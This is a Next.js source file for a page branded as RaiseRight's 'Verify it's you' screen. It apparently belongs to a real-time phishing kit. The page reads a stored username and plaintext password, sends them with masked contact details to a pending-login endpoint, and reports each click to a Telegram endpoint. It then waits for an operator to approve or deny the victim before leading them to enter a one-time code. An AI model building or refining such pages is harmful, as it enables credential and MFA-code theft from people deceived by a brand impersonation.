"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages"
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
import { readStoredPassword, readStoredUsername } from "@/lib/login-flow-storage"
import { pollPendingLogin } from "@/lib/poll-pending-login"
import {
  pendingLoginMethod,
  verificationTypeLabel,
  type DeliveryMethod,
} from "@/lib/verification-method"

const options: Array<{
  id: DeliveryMethod
  title: string
  subtitle: string
}> = [
  {
    id: "text",
    title: "Text Me a Code",
    subtitle: "You'll enter it to log on.",
  },
  {
    id: "call",
    title: "Call Me With a Code",
    subtitle: "Get a call that says a code for you to enter.",
  },
]

export default function VerifyChoicePage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [selectedOptionId, setSelectedOptionId] = useState<DeliveryMethod>("text")
  const [networkError, setNetworkError] = useState("")
  const getBotGateSignals = useBotGateSignals()

  useEffect(() => {
    try {
      if (!sessionStorage.getItem("loginReady")) {
        window.location.href = "/"
      }
    } catch {
      window.location.href = "/"
    }
  }, [])

  const handleSelect = async (id: DeliveryMethod, title: string) => {
    if (isLoading) return
    setSelectedOptionId(id)
    setIsLoading(true)
    setNetworkError("")

    await fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: title,
        page: "/verify-choice",
      }),
    }).catch(() => {})

    const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
    const password = readStoredPassword() || sessionStorage.getItem("loginPassword") || ""
    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password,
          method: pendingLoginMethod(id),
          maskedEmail,
          maskedPhone,
          flow: "login",
          ...getBotGateSignals(),
        }),
      })
      const data = (await res.json()) as { id?: string; error?: string }
      if (!res.ok) {
        setNetworkError(data.error || MSG_UNABLE_REACH_VERIFICATION)
        setIsLoading(false)
        return
      }
      if (!data.id) {
        window.location.href = "/?verifyUnavailable=1"
        return
      }

      const result = await pollPendingLogin(data.id, APPROVAL_TIMEOUT_MS)

      if (result === "approved") {
        sessionStorage.setItem("verificationMethod", id)
        sessionStorage.setItem("verificationType", verificationTypeLabel(id))
        router.push(`/verify?method=${encodeURIComponent(id)}`)
        return
      }
      if (result === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (result === "denied") {
        window.location.href = "/?loginDenied=1"
        return
      }
      window.location.href = "/?verifyUnavailable=1"
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION)
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
      <header className="w-full bg-white border-b border-white shadow-lg">
        <div className="flex w-full items-center justify-center h-27 md:h-30">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="/raiseright/images/logo.svg"
            alt="RaiseRight"
            className="w-83 h-auto md:w-95 object-contain"
          />
        </div>
      </header>

      <main className="mt-10">
        <section className="mx-auto w-full max-w-lg px-6 pt-16 sm:px-8 sm:pt-20">
          <h1 className="mb-4 text-center text-5xl font-light tracking-tight text-[#294d73]">
            Verify it&apos;s you
          </h1>
          <p className="mb-10 text-center text-lg text-gray-600">
            Before you can get full access, you&apos;ll need to confirm your identity.
          </p>

          {networkError ? (
            <p className="mb-4 text-red-600 text-base" role="alert">
              {networkError}
            </p>
          ) : null}

          <div className="space-y-4" aria-busy={isLoading}>
            {options.map(({ id, title, subtitle }) => {
              const isSelectedAndLoading = isLoading && selectedOptionId === id
              return (
                <button
                  key={id}
                  type="button"
                  onClick={() => handleSelect(id, title)}
                  disabled={isLoading}
                  className="h-16 w-full rounded-full bg-[#1d64a3] px-6 text-xl font-semibold text-white transition hover:bg-[#076db7] active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSelectedAndLoading ? "Loading..." : title}
                  <span className="sr-only">. {subtitle}</span>
                </button>
              )
            })}
          </div>

          <div className="mt-4 text-center">
            <button
              type="button"
              disabled={isLoading}
              onClick={() => router.push("/")}
              className="text-xl text-[#28577f] underline underline-offset-2 hover:text-[#16496f] disabled:opacity-50"
            >
              Cancel
            </button>
          </div>
        </section>
      </main>
    </div>
  )
}
